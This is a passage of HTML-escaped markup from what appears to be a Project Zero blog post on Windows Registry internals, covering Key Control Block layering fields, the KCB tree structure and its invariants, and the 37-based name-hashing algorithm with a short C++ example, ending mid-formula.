 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;Layered keys were introduced in Windows 10 version 1607 to support containerisation through differencing hives. Because overlaying hives on top of each other is primarily a runtime concept, the Key Control Block (KCB) is the natural place to hold the state related to this feature, and there are three main members involved in this process:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0 tTszyzmaCA-c29&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_3ebgtidubwl1-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;LayerSemantics:&lt;/span&gt;&lt;span&gt;&amp;nbsp;This 2-bit field indicates the state of a key within the layering system. It is an exact copy of the key&amp;#39;s _CM_KEY_NODE.LayerSemantics value, cached in KCB for easier/quicker access. For a detailed overview of its possible values, please refer to &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c22&quot;&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2024/12/the-windows-registry-adventure-5-regf.html&quot;&gt;Part 5&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;LayerHeight:&lt;/span&gt;&lt;span&gt;&amp;nbsp;This field specifies the level of the key within the differencing hive stack. A higher LayerHeight indicates that the key is higher up in the stack of layered hives, and a value of zero is used for &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c44&quot;&gt;base hives&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;(i.e. normal non-differencing hives loaded on the host system).&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;LayerInfo:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;This is a pointer to a _CM_KCB_LAYER_INFO structure, which describes the key&amp;#39;s position within the stack of differencing hives. Among other things, it contains a pointer to the lower layer on the key stack, and the head of a list of layers above the current one.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;
 &lt;p class=&quot;tTszyzmaCA-c0 tTszyzmaCA-c29&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;The specifics of the structures associated with this functionality are discussed in the &amp;quot;Layered keys&amp;quot; section below.&lt;/span&gt;&lt;/p&gt;&lt;h4 class=&quot;tTszyzmaCA-c21 tTszyzmaCA-c13&quot; id=&quot;h.t4mf5qrfsuo0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c35 tTszyzmaCA-c4&quot;&gt;KCB tree structure&lt;/span&gt;&lt;/h4&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span&gt;While key bodies are a common way to access KCB structures, they&amp;#39;re not the only method.&lt;/span&gt;&lt;span&gt;&amp;nbsp;They&lt;/span&gt;&lt;span&gt;&amp;nbsp;are integral when you have an open handle to a key, as operations on the handle follow the handle &amp;rarr; key body &amp;rarr; KCB translation path.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;However, looking up keys by name or path is also crucial.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Whether a key is opened or created, it relies on either an existing handle and a relative path (single subkey name or a longer path with backslash-separated names), or an absolute path starting with &amp;quot;\Registry\&amp;quot;.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;In this scenario, the kernel needs to quickly check if a KCB exists for the given key and to obtain its address if it does.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;To achieve this, KCBs are organized into their own tree structure, which the kernel can traverse.&lt;/span&gt;&lt;span&gt;&amp;nbsp;The&lt;/span&gt;&lt;span&gt;&amp;nbsp;tree is rooted in CmpRegistryRootObject (specifically CmpRegistryRootObject-&amp;gt;KeyControlBlock, as CmpRegistryRootObject itself is the key body representing the \Registry key), and mirrors the current registry layout from a high-level perspective&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0 tTszyzmaCA-c29&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c39 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg8RW1Za0ytuWX-XSA-9nYTvlV8_VHC4wXPs4_OVW3Y7-bRCnVAAG_nQ8Xs354AQ497TsBr-43oft7iVHfvmO9NwTl3TtlnKa6MCrraO0eEiknpK15HdGTiBG1YqysuA1h7qUnranUKJjSGWXSlSJRzxZV3b6SP3sN0-ssJObEb80WCOsZlmEez8LZiUvI/s1200/image8.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg8RW1Za0ytuWX-XSA-9nYTvlV8_VHC4wXPs4_OVW3Y7-bRCnVAAG_nQ8Xs354AQ497TsBr-43oft7iVHfvmO9NwTl3TtlnKa6MCrraO0eEiknpK15HdGTiBG1YqysuA1h7qUnranUKJjSGWXSlSJRzxZV3b6SP3sN0-ssJObEb80WCOsZlmEez8LZiUvI/s1200/image8.png&quot; border=&quot;0&quot; alt=&quot;Diagram illustrating the Windows Registry Key Control Block (KCB) tree structure used for key lookups by name or path. The tree starts with the REGISTRY root, branching into top-level keys like MACHINE and USER. It further details the hierarchy under MACHINE, showing SOFTWARE linked to another SOFTWARE node which contains keys like Classes, Microsoft, and Windows NT, mirroring the registry&amp;#39;s layout. Cloud symbols indicate deeper nesting within the structure.&quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;Diagram illustrating the Windows Registry Key Control Block (KCB) tree structure used for key lookups by name or path. The tree starts with the REGISTRY root, branching into top-level keys like MACHINE and USER. It further details the hierarchy under MACHINE, showing SOFTWARE linked to another SOFTWARE node which contains keys like Classes, Microsoft, and Windows NT, mirroring the registry&amp;#39;s layout. Cloud symbols indicate deeper nesting within the structure.&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c39 tTszyzmaCA-c13 tTszyzmaCA-c29&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0 tTszyzmaCA-c60&quot;&gt;&lt;span&gt;Let&amp;#39;s highlight several key points:&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_q60yv0wr6jjb-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c48 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;KCB&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;&amp;nbsp;Existence:&lt;/span&gt;&lt;span&gt;&amp;nbsp;There&amp;#39;s no guarantee that a corresponding KCB exists for every registry key.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;KCBs are allocated &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c44&quot;&gt;lazily&lt;/span&gt;&lt;span&gt;&amp;nbsp;only when a key is opened, created, or when a KCB that depends on the one being created is about to be allocated.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c15 c48 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;Consistent KCB Tree Structure:&lt;/span&gt;&lt;span&gt;&amp;nbsp;The KCB tree structure is always consistent.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;If a KCB exists for a key, then KCBs for all its ancestors up to the root \Registry key must also exist.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c48 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;Cached Information in KCBs:&lt;/span&gt;&lt;span&gt;&amp;nbsp;KCBs contain cached information from the key node, plus additional runtime information that may not yet be in the hive (e.g., pending transactions).&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Before performing any operation on a key, it&amp;#39;s crucial to consult its KCB.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c48 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;KCB Uniqueness&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;:&lt;/span&gt;&lt;span&gt;&amp;nbsp;At any given time, there can be only one KCB corresponding to a specific key attached to the tree.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;It&amp;#39;s possible for multiple KCBs of the same key to exist in memory, but only if some of them correspond to deleted instances, in which case they are no longer visible in the global tree (only through the handles, until they are closed).&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Before creating a new KCB, the kernel should always ensure that there isn&amp;#39;t an existing one, and if there is, use it.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Failing to maintain this invariant can lead to severe consequences, &lt;/span&gt;&lt;span&gt;as illustrated by &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c22&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451531&quot;&gt;CVE-2023-23420&lt;/a&gt;&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c48 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;KCB Tree and Hives:&lt;/span&gt;&lt;span&gt;&amp;nbsp;The KCB tree combines key descriptors from different hives and therefore must implement support for &amp;quot;exit nodes&amp;quot; and &amp;quot;entry nodes&amp;quot;, as described in the previous blog post.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Both exit and entry nodes have corresponding KCBs that can be viewed and analyzed in WinDbg.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Resolving transitions between exit and entry nodes generally involves reading the (&lt;/span&gt;&lt;span&gt;_HHIVE*&lt;/span&gt;&lt;span&gt;, root cell index) pair from the exit node and then locating and navigating to the corresponding KCB in the destination hive.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;To speed up this process, the kernel uses an optimization that sets the CM_KCB_SYM_LINK_FOUND flag (0x8) in the exit node&amp;#39;s KCB and stores the entry node&amp;#39;s KCB address in KCB.LinkTarget, simulating a resolved symbolic link and avoiding the need to look up the entry&amp;#39;s KCB every time the key is traversed.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;In the diagram above, entry keys are marked in blue, exit nodes in orange, and the special connection between them by &lt;/span&gt;&lt;span&gt;the&lt;/span&gt;&lt;span&gt;&amp;nbsp;connector&lt;/span&gt;&lt;span&gt;&amp;nbsp;with black squares&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c48 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;Key Depth:&lt;/span&gt;&lt;span&gt;&amp;nbsp;Every open key in the system has a depth in the global tree, representing the number of nesting levels separating it from the root.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This value is stored in the TotalLevels field.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;For example, the root key \Registry has a depth of 1, and the key \Registry\Machine\Software\Microsoft\Windows has a depth of 5.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c48 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;Parent KCB Pointer:&lt;/span&gt;&lt;span&gt;&amp;nbsp;Every initialized KCB structure (whether attached to the tree or not) contains a pointer to its parent KCB in the ParentKcb field.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The only exception is the global root \Registry, for which this pointer is NULL.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span&gt;Now that we understand how the KCB tree works conceptually, let&amp;#39;s examine how it is represented in memory.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Interestingly, the KCB structure itself doesn&amp;#39;t store a list of its subkeys.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Instead, it relies on a simple 32-bit hash of the text string for fast lookups by name.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The hash is calculated by multiplying successive characters of the string by powers of 37, where the first character is multiplied by the highest power and the last by the lowest (37&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c27&quot;&gt;0&lt;/span&gt;&lt;span&gt;, which is 1)&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This allows for a straightforward iterative implementation, shown below in C code:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c8&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;uint32_t&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;HashString(&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c28&quot;&gt;const&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;std::string&amp;amp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;str)&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;uint32_t&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c19&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c8&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c4 tTszyzmaCA-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c28&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;(size_t&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c19&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;str.size();&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;i++)&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c19&quot;&gt;37&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;toupper(str[i]);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c8&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c4 tTszyzmaCA-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c28&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;hash;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c23&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;br/&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;Some example outputs of the algorithm are:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c8&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;HashString(&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;&amp;quot;Microsoft&amp;quot;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c19&quot;&gt;0x7f00cd26&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;HashString(&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;&amp;quot;Windows&amp;quot;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c19&quot;&gt;0x2f7de68b&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;HashString(&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;&amp;quot;CurrentVersion&amp;quot;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c19&quot;&gt;0x7e25f69d&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c23&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;br/&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span&gt;To calculate the hash of a path with multiple components, the same algorithm steps are repeated.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;However, in this case, the hashes of the successive path parts are treated similarly to the letters in the previous example.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Therefore, &lt;/span&gt;&lt;span&gt;the following formula is used &lt;/span&gt;&lt;span&gt;to calculate the hash of the full &lt;/span&gt;&lt;span&gt;&amp;quot;Microsoft\Windows\CurrentVersion&amp;quot; &lt;/span&gt;&lt;span&gt;path:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c8&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;0x7f00cd26&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;&amp;times;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;37&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1 tTszyzmaCA-c27&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;0x2f7de68b&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;&amp;times;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;37&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1 tTszyzmaCA-c27&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;0x7e25f69d&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;&amp;times;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;37&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1 tTszyzmaCA-c27&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;=&lt;/span&gt;&lt;span 